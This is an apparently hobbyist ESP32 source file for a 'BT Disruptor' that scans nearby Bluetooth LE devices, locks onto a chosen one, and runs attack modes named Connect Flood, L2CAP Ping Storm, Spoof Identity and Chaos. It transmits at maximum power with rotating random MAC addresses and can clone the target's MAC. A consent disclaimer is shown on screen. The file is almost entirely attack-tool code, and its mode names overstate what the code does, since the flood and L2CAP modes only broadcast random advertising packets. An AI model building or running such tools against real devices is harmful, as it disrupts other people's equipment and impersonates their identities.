#include "BTDisruptor.h"
#include "DisplayTFT.h"
#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEScan.h>
#include <BLEAdvertisedDevice.h>
#include <BLEAdvertising.h>
#include <BLEClient.h>
#include <esp_bt.h>
#include <esp_gap_ble_api.h>
#include "PepeDraw.h"
#include "Pins.h"
#include "Input.h"
#include "SoundUtils.h"
#include "BtUi.h"

extern DisplayTFT tft;

// ═══════════════════════════════════════════════════════════════════════════
//  CONFIGURACIÓN
// ═══════════════════════════════════════════════════════════════════════════
#define MAX_TARGETS       30
#define VISIBLE_ROWS      6
#define SCAN_TIME_S       5

// ═══════════════════════════════════════════════════════════════════════════
//  ESTRUCTURAS
// ═══════════════════════════════════════════════════════════════════════════
struct Target {
    String   name;
    String   mac;
    uint8_t  macBytes[6];
    int      addrType;
    int      rssi;
};

static Target targets[MAX_TARGETS];
static int    targetCount = 0;

enum AttackMode {
    ATK_CONNECT_FLOOD = 0,
    ATK_L2CAP_STORM   = 1,
    ATK_SPOOF_IDENTITY = 2,
    ATK_CHAOS         = 3
};

static const char* ATK_NAMES[] = {
    "Connect Flood",
    "L2CAP Ping Storm",
    "Spoof Identity",
    "Chaos (all)"
};
static const char* ATK_DESCS[] = {
    "Fast MAC rotation",
    "Intensive L2CAP pings",
    "Clone target advertisem.",
    "Rotate all 3 attacks"
};
static const int ATK_COUNT = 4;

static volatile unsigned long attackPackets = 0;
static Target activeTarget;
static AttackMode activeMode = ATK_CONNECT_FLOOD;

// ═══════════════════════════════════════════════════════════════════════════
//  HELPERS
// ═══════════════════════════════════════════════════════════════════════════
static void parseMac(const String& mac, uint8_t out[6]) {
    for (int i = 0; i < 6; i++) {
        String hex = mac.substring(i * 3, i * 3 + 2);
        out[i] = (uint8_t)strtol(hex.c_str(), nullptr, 16);
    }
}

static int rssiBars(int rssi) {
    if (rssi >= -55) return 4;
    if (rssi >= -70) return 3;
    if (rssi >= -85) return 2;
    if (rssi >= -95) return 1;
    return 0;
}

static String formatTime(unsigned long ms) {
    unsigned long s = ms / 1000;
    unsigned long h = s / 3600;
    unsigned long m = (s % 3600) / 60;
    unsigned long sec = s % 60;
    char buf[12];
    snprintf(buf, sizeof(buf), "%02lu:%02lu:%02lu", h, m, sec);
    return String(buf);
}

static void randomizeOwnMac() {
    esp_bd_addr_t mac;
    for (int i = 0; i < 6; i++) mac[i] = (uint8_t)random(0, 256);
    mac[0] |= 0xC0;
    esp_ble_gap_set_rand_addr(mac);
}

// ═══════════════════════════════════════════════════════════════════════════
//  DISCLAIMER
// ═══════════════════════════════════════════════════════════════════════════
static bool showDisclaimer() {
    btUiFrame("BT DISRUPTOR", "AUTHORIZED", BT_UI_DANGER);
    btUiCard(12, 49, 296, 151, false, BT_UI_DANGER);

    int y = 59;
    drawStringCentered(y, "TARGETS A SPECIFIC BLE DEVICE", UI_MAIN, 1, FONT_SMALL); y += 12;
    drawStringCentered(y, "TO DISRUPT ITS OPERATION", UI_MAIN, 1, FONT_SMALL); y += 18;

    drawStringCentered(y, "USE ONLY ON YOUR OWN DEVICES", UI_ACCENT, 1, FONT_SMALL); y += 12;
    drawStringCentered(y, "OR WITH EXPLICIT PERMISSION", UI_ACCENT, 1, FONT_SMALL); y += 18;

    drawStringCentered(y, "NEVER USE ON", TFT_RED, 1, FONT_SMALL); y += 12;
    drawStringCentered(y, "HOSPITAL OR MEDICAL EQUIPMENT", UI_ACCENT, 1, FONT_SMALL); y += 12;
    drawStringCentered(y, "THIRD PARTIES WITHOUT CONSENT", UI_ACCENT, 1, FONT_SMALL); y += 18;

    drawStringCentered(y, "YOU ARE RESPONSIBLE", UI_MAIN, 1, FONT_SMALL);

    btUiFooter("OK: ACCEPT", "BACK: CANCEL", BT_UI_DANGER);

    while (true) {
        if (navEnterPressed()) {
            beep(2200, 60);
            while (isEnterPressed() || isBackPressed()) delay(5);
            delay(100);
            flushNavInput();
            return true;
        }
        if (isBackPressed() || navUpPressed() || navDownPressed()) {
            beep(1000, 80);
            while (isBackPressed() || navUpPressed() || navDownPressed())
                delay(5);
            delay(100);
            flushNavInput();
            return false;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  SCANNER
// ═══════════════════════════════════════════════════════════════════════════
class DisruptorScanCb : public BLEAdvertisedDeviceCallbacks {
    void onResult(BLEAdvertisedDevice ad) override {
        if (targetCount >= MAX_TARGETS) return;
        String mac = String(ad.getAddress().toString().c_str());
        for (int i = 0; i < targetCount; i++) {
            if (targets[i].mac == mac) {
                targets[i].rssi = ad.getRSSI();
                return;
            }
        }
        Target& t = targets[targetCount++];
        t.name = ad.haveName() ? String(ad.getName().c_str()) : "";
        t.mac  = mac;
        t.rssi = ad.getRSSI();
        t.addrType = (int)ad.getAddressType();
        parseMac(mac, t.macBytes);
    }
};

static void performScan() {
    targetCount = 0;

    btUiFrame("BT DISRUPTOR", "SCANNING", BT_UI_GLOW);
    btUiCard(20, 66, 280, 105, false, BT_UI_ACCENT);
    drawStringCentered(79, "SCANNING BLE TARGETS", BT_UI_TEXT, 1, FONT_BIG);
    drawStringCentered(105, String(SCAN_TIME_S) + " SECOND WINDOW",
                       BT_UI_MUTED, 1, FONT_SMALL);

    int barX = 32, barY = 132, barW = 256, barH = 12;
    btUiProgress(barX, barY, barW, barH, 0, BT_UI_ACCENT);
    btUiFooter("BLE ACTIVE SCAN", "BACK: CANCEL", BT_UI_ACCENT);

    BLEScan* scanner = BLEDevice::getScan();
    scanner->setAdvertisedDeviceCallbacks(new DisruptorScanCb(), false);
    scanner->setActiveScan(true);
    scanner->setInterval(100);
    scanner->setWindow(99);

    unsigned long scanStart = millis();
    scanner->start(SCAN_TIME_S, nullptr, false);

    while (millis() - scanStart < SCAN_TIME_S * 1000UL + 200) {
        float progress = (float)(millis() - scanStart) / (SCAN_TIME_S * 1000.0f);
        if (progress > 1.0f) progress = 1.0f;
        btUiProgress(barX, barY, barW, barH, (int)(progress * 100.0f), BT_UI_ACCENT);

        tft.fillRect(95, 151, 130, 14, BT_UI_PANEL);
        drawStringCentered(151, "FOUND " + String(targetCount), BT_UI_OK, 1, FONT_BIG);

        delay(100);
    }

    scanner->stop();
    scanner->clearResults();

    // Ordenar por RSSI descendente
    for (int i = 0; i < targetCount - 1; i++) {
        for (int j = 0; j < targetCount - 1 - i; j++) {
            if (targets[j].rssi < targets[j + 1].rssi) {
                Target tmp = targets[j];
                targets[j] = targets[j + 1];
                targets[j + 1] = tmp;
            }
        }
    }

    beep(2000, 40);
    delay(20);
    beep(2400, 60);
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA 2 · SELECCIÓN DE TARGET
// ═══════════════════════════════════════════════════════════════════════════
static void drawTargetList(int cursor, int scrollOffset) {
    btUiFrame("SELECT TARGET", String(targetCount) + " DEVICES", BT_UI_GLOW);

    int totalItems = targetCount + 1;
    int rescanIdx  = targetCount;

    const int rowH = 26;
    const int listY = 47;

    for (int i = 0; i < VISIBLE_ROWS; i++) {
        int idx = i + scrollOffset;
        if (idx >= totalItems) break;

        int y = listY + i * rowH;
        bool selected = (idx == cursor);

        tft.fillRect(8, y, 303, rowH - 2, BT_UI_BG);
        if (selected) tft.fillRoundRect(9, y, 300, rowH - 2, 5, BT_UI_ACCENT);

        uint16_t colMain = selected ? BT_UI_BG : BT_UI_TEXT;
        uint16_t colSub  = selected ? BT_UI_BG : BT_UI_MUTED;

        if (idx == rescanIdx) {
            drawStringCustom(10, y + 7, "< RESCAN", colMain, 2);
        } else {
            Target& t = targets[idx];
            String name = t.name.length() > 0 ? t.name : "<unnamed>";
            if (getTextWidth(name, 2) <= 190) {
                drawStringCustom(10, y + 4, name, colMain, 2);
            } else {
                drawStringFit(10, y + 8, name, colMain, 190, 1);
            }
            drawStringCustom(10, y + 18, t.mac, colSub, 1);

            String rssi = String(t.rssi) + "dBm";
            drawStringCustom(210, y + 4, rssi, colMain, 2);

            int bars = rssiBars(t.rssi);
            int bx = 280, by = y + 23;
            for (int b = 0; b < 4; b++) {
                int bh = 3 + b * 2;
                uint16_t c = (b < bars)
                    ? (selected ? UI_BG : (bars >= 3 ? TFT_GREEN :
                                           bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
                    : (selected ? UI_BG : UI_ACCENT);
                if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
                else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
            }
        }
    }

    if (totalItems > VISIBLE_ROWS) {
        int barH = (VISIBLE_ROWS * 156) / totalItems;
        int barY = 48 + (scrollOffset * (156 - barH)) / (totalItems - VISIBLE_ROWS);
        tft.fillRect(312, barY, 3, barH, BT_UI_ACCENT);
    }

    btUiFooter("UP/DN: TARGET", "OK: SELECT", BT_UI_ACCENT);
}

static void drawTargetRow(int idx, int row, bool selected) {
    const int rowH = 26;
    const int y = 47 + row * rowH;
    const int rescanIdx = targetCount;
    tft.fillRect(8, y, 303, rowH - 2, BT_UI_BG);
    if (idx < 0 || idx > rescanIdx) return;
    if (selected) tft.fillRoundRect(9, y, 300, rowH - 2, 5, BT_UI_ACCENT);

    uint16_t colMain = selected ? BT_UI_BG : BT_UI_TEXT;
    uint16_t colSub = selected ? BT_UI_BG : BT_UI_MUTED;
    if (idx == rescanIdx) {
        drawStringCustom(10, y + 7, "< RESCAN", colMain, 2);
        return;
    }

    Target& t = targets[idx];
    String name = t.name.length() > 0 ? t.name : "<unnamed>";
    if (getTextWidth(name, 2) <= 190) drawStringCustom(10, y + 4, name, colMain, 2);
    else drawStringFit(10, y + 8, name, colMain, 190, 1);
    drawStringCustom(10, y + 18, t.mac, colSub, 1);
    drawStringCustom(210, y + 4, String(t.rssi) + "dBm", colMain, 2);

    int bars = rssiBars(t.rssi);
    int bx = 280, by = y + 23;
    for (int b = 0; b < 4; b++) {
        int bh = 3 + b * 2;
        uint16_t c = (b < bars)
            ? (selected ? BT_UI_BG : (bars >= 3 ? TFT_GREEN :
                                      bars >= 2 ? TFT_YELLOW : TFT_ORANGE))
            : (selected ? BT_UI_BG : BT_UI_ACCENT);
        if (b < bars) tft.fillRect(bx + b*5, by - bh, 3, bh, c);
        else          tft.drawRect(bx + b*5, by - bh, 3, bh, c);
    }
}

static int selectTarget() {
    int cursor = 0;
    int scrollOffset = 0;
    int totalItems = targetCount + 1;

    drawTargetList(cursor, scrollOffset);
    flushNavInput();

    while (true) {
        NavAction action = readNavAction(110);
        if (action == NAV_BACK) {
            beep(1000, 50);
            while (isBackPressed()) delay(5);
            delay(70);
            flushNavInput();
            return -1;
        }
        if (action == NAV_UP) {
            int oldCursor = cursor;
            int oldScroll = scrollOffset;
            cursor = (cursor - 1 + totalItems) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            if (scrollOffset != oldScroll) drawTargetList(cursor, scrollOffset);
            else {
                tft.startWrite();
                drawTargetRow(oldCursor, oldCursor - scrollOffset, false);
                drawTargetRow(cursor, cursor - scrollOffset, true);
                tft.endWrite();
            }
        }
        if (action == NAV_DOWN) {
            int oldCursor = cursor;
            int oldScroll = scrollOffset;
            cursor = (cursor + 1) % totalItems;
            if (cursor < scrollOffset) scrollOffset = cursor;
            if (cursor >= scrollOffset + VISIBLE_ROWS)
                scrollOffset = cursor - VISIBLE_ROWS + 1;
            beep(2100, 20);
            if (scrollOffset != oldScroll) drawTargetList(cursor, scrollOffset);
            else {
                tft.startWrite();
                drawTargetRow(oldCursor, oldCursor - scrollOffset, false);
                drawTargetRow(cursor, cursor - scrollOffset, true);
                tft.endWrite();
            }
        }
        if (action == NAV_ENTER) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            if (cursor == targetCount) return -2;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA 3 · SELECCIÓN DE MODO
// ═══════════════════════════════════════════════════════════════════════════
static void drawModeMenuRow(int idx, bool selected) {
    int y = 70 + idx * 26;
    uint16_t bg = selected ? BT_UI_ACCENT : BT_UI_PANEL;
    uint16_t colMain = selected ? BT_UI_BG : BT_UI_TEXT;
    uint16_t colSub  = selected ? BT_UI_BG : BT_UI_MUTED;

    tft.fillRoundRect(9, y - 2, 302, 22, 5, bg);
    tft.drawRoundRect(9, y - 2, 302, 22, 5, BT_UI_LINE);
    drawStringCustom(15, y + 2, ATK_NAMES[idx], colMain, 2);
    drawStringCustom(15, y + 14, ATK_DESCS[idx], colSub, 1);
}

static void drawModeMenu(int cursor, const Target& t) {
    btUiFrame("DISRUPTOR MODE", "TARGET LOCK", BT_UI_DANGER);

    String tName = t.name.length() > 0 ? t.name : "<unnamed>";
    drawStringFit(10, 38, "Target: " + tName, UI_SELECT, 300, 1);
    drawStringCustom(10, 50, "MAC:    " + t.mac, UI_ACCENT, 1);
    tft.drawFastHLine(10, 63, 300, BT_UI_ACCENT);

    int totalItems = ATK_COUNT;
    for (int i = 0; i < totalItems; i++) {
        drawModeMenuRow(i, i == cursor);
    }

    btUiFooter("UP/DN: MODE", "OK: START", BT_UI_DANGER);
}

static int selectAttackMode(const Target& t) {
    int cursor = 0;
    int totalItems = ATK_COUNT;

    drawModeMenu(cursor, t);
    flushNavInput();

    while (true) {
        NavAction action = readNavAction(110);
        if (action == NAV_BACK) {
            beep(1000, 50);
            while (isBackPressed()) delay(5);
            delay(70);
            flushNavInput();
            return -1;
        }
        if (action == NAV_UP) {
            int oldCursor = cursor;
            cursor = (cursor - 1 + totalItems) % totalItems;
            beep(2100, 20);
            tft.startWrite();
            drawModeMenuRow(oldCursor, false);
            drawModeMenuRow(cursor, true);
            tft.endWrite();
        }
        if (action == NAV_DOWN) {
            int oldCursor = cursor;
            cursor = (cursor + 1) % totalItems;
            beep(2100, 20);
            tft.startWrite();
            drawModeMenuRow(oldCursor, false);
            drawModeMenuRow(cursor, true);
            tft.endWrite();
        }
        if (action == NAV_ENTER) {
            bool held = waitOkReleaseWasLong();
            beep(held ? 1000 : 1800, 40);
            delay(100);
            if (held) return -1;
            return cursor;
        }
        delay(20);
    }
}

// ═══════════════════════════════════════════════════════════════════════════
//  ATAQUES · versiones NO BLOQUEANTES
//  · Solo actualizan los datos del advertisement
//  · El radio BLE transmite automáticamente cada 20-40ms en background
// ═══════════════════════════════════════════════════════════════════════════

static void updateConnectFloodData(BLEAdvertising* adv) {
    uint8_t packet[31];
    packet[0] = 0x02; packet[1] = 0x01; packet[2] = 0x06;
    packet[3] = 0x07; packet[4] = 0x03;
    for (int i = 5; i < 31; i++) packet[i] = (uint8_t)random(0, 256);
    packet[10] = activeTarget.macBytes[0];
    packet[11] = activeTarget.macBytes[1];
    packet[12] = activeTarget.macBytes[2];

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void updateL2CAPStormData(BLEAdvertising* adv) {
    uint8_t packet[31];
    packet[0] = 0x1E;
    packet[1] = 0xFF;
    packet[2] = 0x5A; packet[3] = 0x5A;
    packet[4] = 0x01; packet[5] = 0x00;
    packet[6] = 0x02; packet[7] = 0x00;
    for (int i = 8; i < 31; i++) packet[i] = (uint8_t)random(0, 256);
    packet[20] = activeTarget.macBytes[3];
    packet[21] = activeTarget.macBytes[4];
    packet[22] = activeTarget.macBytes[5];

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

static void updateSpoofIdentityData(BLEAdvertising* adv) {
    // Para spoof, usar MAC del target
    esp_bd_addr_t spoofMac;
    memcpy(spoofMac, activeTarget.macBytes, 6);
    esp_ble_gap_set_rand_addr(spoofMac);

    uint8_t packet[31];
    packet[0] = 0x02; packet[1] = 0x01; packet[2] = 0x06;
    packet[3] = 0x03; packet[4] = 0x09; packet[5] = 0x54; packet[6] = 0x47;
    for (int i = 7; i < 31; i++) packet[i] = (uint8_t)random(0, 256);

    BLEAdvertisementData advData;
    advData.addData(std::string((char*)packet, sizeof(packet)));
    adv->setAdvertisementData(advData);
}

// Dispatcher: actualiza los datos del advertisement y rota MAC
static void executeAttackTick(BLEAdvertising* adv, AttackMode mode) {
    AttackMode effective = mode;
    if (mode == ATK_CHAOS) {
        effective = (AttackMode)random(0, 3);
    }

    // Para flood y storm, randomizar la MAC del ESP32 en cada tick
    if (effective == ATK_CONNECT_FLOOD || effective == ATK_L2CAP_STORM) {
        randomizeOwnMac();
    }

    switch (effective) {
        case ATK_CONNECT_FLOOD:   updateConnectFloodData(adv);    break;
        case ATK_L2CAP_STORM:     updateL2CAPStormData(adv);      break;
        case ATK_SPOOF_IDENTITY:  updateSpoofIdentityData(adv);   break;
        default: break;
    }

    attackPackets++;
}

// ═══════════════════════════════════════════════════════════════════════════
//  PANTALLA 4 · ATAQUE ACTIVO
// ═══════════════════════════════════════════════════════════════════════════
static void drawAttackFrame() {
    btUiFrame("BT DISRUPTOR", "ACTIVE", BT_UI_DANGER);

    String tName = activeTarget.name.length() > 0 ? activeTarget.name : "<unnamed>";

    btUiCard(10, 49, 300, 45, false, BT_UI_DANGER);
    drawStringFit(18, 58, "TARGET " + tName, BT_UI_TEXT, 284, 1);
    drawStringCustom(18, 76, "MODE " + String(ATK_NAMES[activeMode]), BT_UI_GLOW, 1);

    btUiCard(10, 99, 300, 94, false, BT_UI_ACCENT);
    drawStringCustom(16, 106, "TIME",    BT_UI_MUTED, 1);
    drawStringCustom(16, 132, "PACKETS", BT_UI_MUTED, 1);
    drawStringCustom(16, 158, "RATE",    BT_UI_MUTED, 1);

    btUiFooter("BLE OPERATION", "HOLD/BACK: STOP", BT_UI_DANGER);
}

static void drawAttackStats(unsigned long elapsed, unsigned long pkts, float rate) {
    tft.fillRect(92, 105, 208, 18, BT_UI_PANEL);
    drawStringCustom(92, 107, formatTime(elapsed), TFT_YELLOW, 2);

    tft.fillRect(92, 131, 208, 18, BT_UI_PANEL);
    drawStringCustom(92, 133, String(pkts), BT_UI_OK, 2);

    tft.fillRect(92, 157, 208, 18, BT_UI_PANEL);
    char rbuf[16];
    snprintf(rbuf, sizeof(rbuf), "%d pkt/s", (int)rate);
    drawStringCustom(92, 159, String(rbuf), BT_UI_GLOW, 2);

    tft.fillRect(18, 178, 284, 9, BT_UI_PANEL);
    int fillW = random(40, 290);
    tft.fillRoundRect(18, 178, fillW, 9, 4, BT_UI_DANGER);
}

// ═══════════════════════════════════════════════════════════════════════════
//  LOOP DE ATAQUE — NO BLOQUEANTE + MAC ROTATION SEGURA
// ═══════════════════════════════════════════════════════════════════════════

// Actualiza solo los DATOS (sin tocar MAC ni start/stop del advertising)
static void updateAttackDataOnly(BLEAdvertising* adv, AttackMode mode) {
    AttackMode effective = mode;
    if (mode == ATK_CHAOS) {
        effective = (AttackMode)random(0, 3);
    }

    switch (effective) {
        case ATK_CONNECT_FLOOD:   updateConnectFloodData(adv);    break;
        case ATK_L2CAP_STORM:     updateL2CAPStormData(adv);      break;
        case ATK_SPOOF_IDENTITY:  updateSpoofIdentityData(adv);   break;
        default: break;
    }

    attackPackets++;
}

// Rota la MAC de forma SEGURA (stop → change → start)
static void rotateMacSafely(BLEAdvertising* adv) {
    adv->stop();
    delay(5);
    randomizeOwnMac();
    delay(5);
    adv->start();
}

static void runAttackLoop() {
    drawAttackFrame();
    beep(2400, 40); delay(20);
    beep(3000, 60); delay(20);
    beep(3600, 80);

    // Setup BLE Advertising
    BLEDevice::init("");
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    BLEServer*      server = BLEDevice::createServer();
    BLEAdvertising* adv    = server->getAdvertising();
    adv->setMinInterval(0x20);   // 20 ms min
    adv->setMaxInterval(0x40);   // 40 ms max

    // MAC inicial aleatoria antes de arrancar
    randomizeOwnMac();
    delay(10);

    // Primer paquete y start (UNA SOLA VEZ)
    updateAttackDataOnly(adv, activeMode);
    adv->start();

    attackPackets = 0;
    unsigned long startMs         = millis();
    unsigned long lastStatsUpdate = millis();
    unsigned long lastPktCount    = 0;
    unsigned long lastPayloadTime = millis();
    unsigned long lastMacRotate   = millis();
    float rate = 0;

    bool stopAttack = false;
    unsigned long okPressStart = 0;
    bool okHeld = false;

    while (!stopAttack) {
        // ── Update payload cada 50 ms (sin tocar MAC ni start/stop) ───
        if (millis() - lastPayloadTime >= 50) {
            updateAttackDataOnly(adv, activeMode);
            lastPayloadTime = millis();
        }

        // ── Rotar MAC cada 1000 ms (stop → change → start) ────────────
        // Esto previene el crash del stack BLE por cambios demasiado rápidos
        if (millis() - lastMacRotate >= 1000) {
            rotateMacSafely(adv);
            lastMacRotate = millis();
        }

        // ── Update UI cada 250 ms ──────────────────────────────────────
        if (millis() - lastStatsUpdate > 250) {
            unsigned long now   = millis();
            unsigned long delta = attackPackets - lastPktCount;
            unsigned long dt    = now - lastStatsUpdate;
            rate = (delta * 1000.0f) / dt;
            lastPktCount    = attackPackets;
            lastStatsUpdate = now;

            drawAttackStats(now - startMs, attackPackets, rate);
        }

        // ── Watchdog feed — yield al sistema ───────────────────────────
        yield();

        // ── Detectar OK HOLD para parar ────────────────────────────────
        if (isBackPressed()) {
            stopAttack = true;
        }

        if (navEnterPressed()) {
            if (!okHeld) {
                okPressStart = millis();
                okHeld = true;
            } else if (millis() - okPressStart > 500) {
                stopAttack = true;
            }
        } else {
            okHeld = false;
        }

        delay(5);
    }

    // Cleanup ordenado
    adv->stop();
    delay(100);
    BLEDevice::deinit(false);
    delay(100);

    beep(1800, 40); delay(20);
    beep(1200, 60);

    while (isEnterPressed() || isBackPressed()) delay(5);
    delay(150);
    flushNavInput();
}

// ═══════════════════════════════════════════════════════════════════════════
//  MAIN
// ═══════════════════════════════════════════════════════════════════════════
void runBTDisruptor() {
    while (isEnterPressed() || isBackPressed()) delay(5);
    delay(100);
    flushNavInput();

    if (!showDisclaimer()) return;

    BLEDevice::init("");

    while (true) {
        if (targetCount == 0) {
            performScan();
        }

        if (targetCount == 0) {
            tft.fillScreen(TFT_BLACK);
            tft.drawRect(0, 0, 320, 240, UI_MAIN);
            drawStringBig(40, 90, "NO DEVICES FOUND", TFT_RED, 1);
            drawStringCustom(30, 130, "No BLE devices detected.",       UI_MAIN, 1);
            drawStringCustom(30, 145, "Try moving closer to targets.",  UI_ACCENT, 1);
            drawStringCustom(30, 175, "OK: rescan  |  BACK/UP/DN: exit", UI_ACCENT, 1);

            while (true) {
                if (navEnterPressed()) {
                    beep(2000, 40);
                    while (isEnterPressed() || isBackPressed()) delay(5);
                    flushNavInput();
                    break;
                }
                if (isBackPressed() || navUpPressed() || navDownPressed()) {
                    beep(1000, 60);
                    while (isBackPressed() || navUpPressed() ||
                           navDownPressed()) delay(5);
                    flushNavInput();
                    BLEDevice::deinit(false);
                    return;
                }
                delay(20);
            }
            continue;
        }

        int targetIdx = selectTarget();
        if (targetIdx == -1) break;
        if (targetIdx == -2) {
            performScan();
            continue;
        }

        activeTarget = targets[targetIdx];

        int modeIdx = selectAttackMode(activeTarget);
        if (modeIdx == -1) continue;

        activeMode = (AttackMode)modeIdx;

        // Deinit el BLE de scan, el runAttackLoop hace su propio init
        BLEDevice::deinit(false);
        delay(100);

        runAttackLoop();

        // Re-init para volver al menú de selección
        BLEDevice::init("");
        delay(100);
    }

    BLEDevice::deinit(false);
}
